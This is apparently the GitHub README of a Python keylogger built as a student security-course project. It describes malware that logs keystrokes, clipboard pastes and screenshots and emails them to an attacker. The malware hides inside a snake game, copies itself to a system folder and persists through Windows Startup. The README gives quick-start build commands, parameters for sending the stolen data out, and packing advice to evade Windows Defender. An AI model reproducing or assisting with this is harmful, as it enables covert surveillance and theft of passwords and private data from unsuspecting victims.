## **An Advanced Keylogger Implemented in Python**
### **Features**
- Record the output of the full keyboard
- Also record the content of the paste action
- Take a screenshot every time user switch between windows
- Packaged and collected information sent to a specified email address
- It will copy itself to the C:drive (C:\SysServers)
- Disguised as a snake game, it will run the backup keylogger after "GAMEOVER" (Yeah, also for the user)
  - Game come from https://github.com/rajatdiptabiswas/snake-pygame
- Add the backup keylogger to Windows Startup, so it will run automatically at startup in Windows
- There is a Backdoor, Press "F12" to terminate the program, otherwise you need to go to the task manager to terminate the "system.exe"
### **Usage**
**System requirements**
- MS Windows (tested on 10)
- Python 2.7

**Quick start**
1. `git clone https://github.com/Zeal-L/Key-paste-screen-logger`
2. `cd Key-paste-screen-logger`
3. `pip install requirements.txt`
4. `pyinstaller -F -w -n snake system.py`
5. `cd dist/ && ./snake.exe `

**Advanced Packing**
- Use Cython to convert programs to C for faster execution and encryption.
- It is also useful to shell the program to avoid being killed by Windows Defender Security Center.
- You may need to install the corresponding Python version of Visual Studio to successfully convert py to pyd, otherwise it will report "Unable to find vcvarsall.bat" error
1. `pip install requirements.txt`
2. `python shell.py build_ext --inplace`
3. `pyinstaller -F -w -n snake index.py`
4. `cd dist/ && ./snake.exe `


**Modifiable Parameters**  
| Argument | Usage |
| -------- | ----- |
|`SEND_INTERVAL`|How many times the user does window switches are needed for the keylogger to compress all the information and send it to the hacker.|
|`E_ADDRESS` & `E_PASSWORD`| Mailboxes used to send packaged messages, If you use Google Mail, note that you must enable IMAP Access and "Control access to less secure apps" for your Gmial.|
|`RECEIVER`|Email address for receiving packaged information.|

**Other**
- This project was used as my COMP6841 something awesome project, if you are interested you can watch my demo video here:
  - https://www.youtube.com/watch?v=SPiu6UsOxs4
